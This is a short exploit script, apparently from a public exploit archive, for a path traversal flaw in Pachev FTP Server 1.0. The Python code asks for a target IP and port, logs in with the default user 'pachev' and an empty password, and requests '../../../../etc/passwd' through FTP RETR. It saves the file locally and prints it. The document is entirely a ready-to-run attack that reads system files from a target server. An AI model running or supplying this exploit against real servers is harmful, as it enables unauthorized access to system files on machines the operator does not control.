# Exploit Title: Pachev FTP Server 1.0 - Path Traversal
# Date: 2020-01-23
# Vulnerability: Path Traversal
# Exploit Author: 1F98D
# Vendor Homepage: https://github.com/pachev/pachev_ftp

from ftplib import FTP

ip = raw_input("Target IP:")
port = int(raw_input("Target Port:"))

ftp = FTP()
ftp.connect(host=ip, port=port)
ftp.login('pachev', '')                   
ftp.retrbinary('RETR ../../../../../../../../etc/passwd', open('passwd.txt', 'wb').write)
ftp.close()
file = open('passwd.txt', 'r')
print "[**] Printing the contents of /etc/passwd\n"
print file.read()
